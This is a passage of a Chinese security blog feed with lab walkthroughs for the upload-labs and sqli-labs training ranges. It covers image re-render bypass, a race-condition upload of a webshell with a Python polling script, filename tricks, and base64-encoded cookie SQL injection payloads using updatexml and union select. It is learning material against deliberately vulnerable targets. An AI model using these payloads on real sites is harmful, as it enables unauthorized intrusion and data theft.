class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>basename</code>：获取最路径字符串的基本路径（也就是文件名）</p></li><li><p><code>unlink</code>：上传文件，用于修复靶场之前的漏洞</p></li><li><p><code>imagecreatefromxxx</code>：通过文件路径或者url生成新图像</p></li><li><p><code>imagexxx</code>：从路径或者url生成一个新图像</p></li></ul><p>总体逻辑就是只能上传三种格式的图片，经过php内置函数的二次渲染，如果原本的图片内部存在php后门代码那么经过二次渲染之后的图片就没有后门代码了。关于二次渲染的原理不是很懂，网上也说得不是很清楚，但是可以通过原图和经过二次渲染的图片进行比较来修改图片，需要知道一点基本的图片二进制格式，在修改时知道哪里需要修改。这里参考网上一些师傅的做法。</p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>将经过二次渲染的图片和原图进行比较，看看那些地方没有修改，然后在没有修改的地方进行添加，每一张gif图片相同处不会一样。</p><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>需要了解PNG图片的格式，才知道如何修改才能让函数检测不出来，需要计算png图片的crc值，当payload写入图片时，crc值会随着payload的长度改变。</p><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>这个需要使用一个国外大神的脚本，将payload写入.jpg格式的图片中，重新渲染的图片就会存在payload，且经过后端的代码再次二次渲染之后payload也不会消失。</p><h1 id="Less-17-代码逻辑漏洞，条件竞争"><a href="#Less-17-代码逻辑漏洞，条件竞争" class="headerlink" title="Less-17(代码逻辑漏洞，条件竞争)"></a>Less-17(代码逻辑漏洞，条件竞争)</h1><p>代码审计，看源码，第一次审计代码，然后看到了一个新名词（条件竞争），也是第一次接触条件竞争。看了网上的简单讲解好像有些明白了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];<span class="comment">//获取文件名</span></span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];<span class="comment">//获取上传备份文件</span></span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);<span class="comment">//获取文件后缀名</span></span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;<span class="comment">//得到上传路径</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码逻辑如下：首先上传文件，在判断文件后缀名是否合法，这个操作比较关键（用网上的话说就是引狼入室），如果文件后缀名合法则修改文件名称，如果不合法则使用unlink函数删除文件。</p><p>在看网上的文章将条件竞争时总感觉少了点什么：php脚本本身是单线程，实现高并发的是服务器，这样的话应该每进行一次上传操作服务器会启用一个单独的线程来进行管理，为什么会造成条件竞争呢？</p><p>在仔细看了看网上的文章，主要过程如下：不断向服务器发送恶意数据包，代码先将文件临时存储在服务器，然后再由后端代码判断。后端判断文件是否正常需要时间，然后在后端判断操作执行之前不断的访问那个恶意文件，如果访问成功，那么恶意文件就暂时不会被删除。</p><p>简单来说原理就是：在我们进行文件读写操作时，是不能删除该文件的。</p><p>首先需要使用bp来进行多线程发包，然后在使用Python来进行监控。这里还学到一个东西，关于<code>docker</code>的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python监控代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://172.17.0.2:80/upload/shell.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;YES,you upload it!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure><p>刚开始使用的ip地址和端口是<code>0.0.0.0:88</code>，当时没有想那么多，但是后面发现<code>Python</code>的<code>requests</code>一直报502错误，找了很久没找到原因，突然想到<code>0.0.0.0:88</code>是<code>docker</code>从容器中映射到本地的ip地址，如果需要请求那么ip地址应该是容器内的真实ip地址，这个地方卡了很久。</p><p>使用命令<code>docker inspect upload-labs</code>查看容器详细内容，里面说明了容器的网关地址和现在的使用的<code>IPAddress</code>，然后在去请求，秒通。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211009175045340.png" alt="docker inspect"></p><p>用脚本跑起来后就是一考验手速的问题了，一直F5刷新页面，可以看待偶尔会出现<code>phpinfo()</code>页面，蚁剑连上去也是断断续续的。</p><h1 id="Less-18-条件竞争，图片马"><a href="#Less-18-条件竞争，图片马" class="headerlink" title="Less-18(条件竞争，图片马)"></a>Less-18(条件竞争，图片马)</h1><p>也是代码审计题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();<span class="comment">//利用时间戳进行文件命名</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">     **</span></span><br><span class="line"><span class="comment">     ** Method to upload the file.</span></span><br><span class="line"><span class="comment">     ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">     ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">     ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> ); <span class="comment">//check file upload path</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();<span class="comment">//check upload file extension</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();<span class="comment">//check upload file size</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码定义了<code>upload</code>类，依次调用其中的方法，检测文件的顺序为：</p><p>检测目录 -&gt; 检测文件后缀名 -&gt; 检测文件大小 -&gt; 检测文件是否存在 -&gt; 将文件上传到服务器 -&gt; 重命名文件</p><p>所以这关可以使用图片马加条件竞争的方式去Pass，首先文件后缀名需要符合要求，才能上传到服务器，这个过程利用条件竞争来拿到网站<code>shell</code>(手速一定要快)</p><p>使用场景与触发条件：</p><ul><li>服务器能多后缀名解析（或者其他解析漏洞），这个实在服务器层面</li><li>如果服务器层面上没有解析漏洞，那么就需要代码层面有文件包含漏洞（但是如果有文件包含漏洞就不需要条件竞争了）</li><li>代码逻辑为先上传，在重命名</li></ul><p>总结：Pass-17与Pass-18都是使用条件竞争，其实条件竞争本身不是漏洞，只是在后端代码层面上出现了逻辑漏洞（先上传后判断在改名，所谓的引狼入室），在发现存在先上传后判断的代码都可测试使用条件竞争来<code>get webshell</code></p><h1 id="Less-19-上传文件名可控，多方法绕过"><a href="#Less-19-上传文件名可控，多方法绕过" class="headerlink" title="Less-19(上传文件名可控，多方法绕过)"></a>Less-19(上传文件名可控，多方法绕过)</h1><p>这一关上传文件需要自定义文件名，文件名参数可控，那么方式就很多了。在windows和Linux上有不同的文件名称管理机制</p><p>后缀，空格，多点空格，%00截断绕过都可以，只需要在抓包的时候修改就OK。</p><h1 id="Less-20-CTF"><a href="#Less-20-CTF" class="headerlink" title="Less-20(CTF)"></a>Less-20(CTF)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123; <span class="comment">//如果$file不是数组就进行分割</span></span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));<span class="comment">//将文件名全小写并且使用.分割</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);<span class="comment">//得到文件后缀名</span></span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];<span class="comment">//过滤掉多余的.号，防止服务器多重解析</span></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数<code>$file</code>可控，看下来经过一系列过滤后就是<code>$img_path = UPLOAD_PATH . &#39;/&#39; . $file_name</code>，<code>$file_name</code>就是参数<code>$file</code>过滤后的形式。</p><p>从后往前看发现问题不大，审代码发现这样一句<code> if (!is_array($file))</code>，这句话问题较大，如果<code>$file</code>是数组就不会进行分割</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前提知识&quot;&gt;&lt;a href=&quot;#前提知识&quot; class=&quot;headerlink&quot; title=&quot;前提知识&quot;&gt;&lt;/a&gt;前提知识&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://segmentfault.com/a/1190000037411957&quot;&gt;文件上传知识&lt;/</summary>
      
    
    
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>sql-lab-adv</title>
    <link href="http://example.com/3/"/>
    <id>http://example.com/3/</id>
    <published>2021-09-27T10:45:09.582Z</published>
    <updated>2022-01-01T09:52:50.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-21-22"><a href="#Less-21-22" class="headerlink" title="Less-21/22"></a>Less-21/22</h1><p>Less-21: <img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926215558973.png"></p><p>Cookie注入，使用的是base64编码进行注入，这里有两种方法：报错注入和普通的联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错注入payload: YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IHZlcnNpb24oKSksIDB4N2UpLCAxKSAj</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926220728677.png" alt="报错注入"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">联合注入payload: YWRtaW4nKSBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLDIsMyAj</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926220846575.png" alt="联合注入"></p><p>两种方法都是先将注入语句进行base64编码之后在抓包修改Cookie头部信息</p><p>Less-22: <img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926221139355.png"></p><p>双引号Cookie头部注入，应该也是两种方式，报错和联合，尝试一下。</p><p>果然</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">联合payload：admin&quot; and 1=2 union select 1,2,3 </span><br><span class="line">base64编码：YWRtaW4iIGFuZCAxPTIgdW5pb24gc2VsZWN0IDEsMiwzICM=</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926221457182.png" alt="联合注入"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">报错注入payload：admin&quot; and updatexml(1, concat(0x7e, (select version()), 0x7e), 1) #</span><br><span class="line">base64编码：YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSwgY29uY2F0KDB4N2UsIChzZWxlY3QgdmVyc2lvbigpKSwgMHg3ZSksIDEpICM=</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926221749976.png" alt="报错注入"></p><h1 id="Less-23-24"><a href="#Less-23-24" class="headerlink" title="Less-23/24"></a>Less-23/24</h1><p>Less-23：<img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926221913938.png"></p><p>报错注入，基于strip comments(看不懂是啥意思)，看了源码后推断应该绕过简单的过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 过滤特殊字符部分源码</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span 